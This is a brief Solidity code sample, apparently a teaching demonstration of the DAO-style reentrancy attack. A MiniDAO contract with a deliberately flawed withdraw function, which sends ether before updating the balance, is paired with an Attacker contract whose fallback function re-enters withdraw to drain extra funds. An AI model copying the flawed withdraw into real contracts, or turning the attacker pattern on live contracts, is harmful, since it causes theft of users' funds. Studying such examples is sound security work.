contract MiniDAO {
    mapping (address => uint) balances;

    function deposit() {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) {
        if(balances[msg.sender] < amount) throw;
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }
}

contract Attacker {

    // limit the recursive calls to prevent out-of-gas error
    uint stack = 0;
    uint constant stackLimit = 10;
    uint amount;
    MiniDAO dao;

    function Attacker(address daoAddress) {
        dao = MiniDAO(daoAddress);
        amount = msg.value;
        dao.deposit.value(msg.value)();
    }

    function attack() {
        dao.withdraw(amount);
    }

    function() {
        if(stack++ < 10) {
            dao.withdraw(amount);
        }
    }
}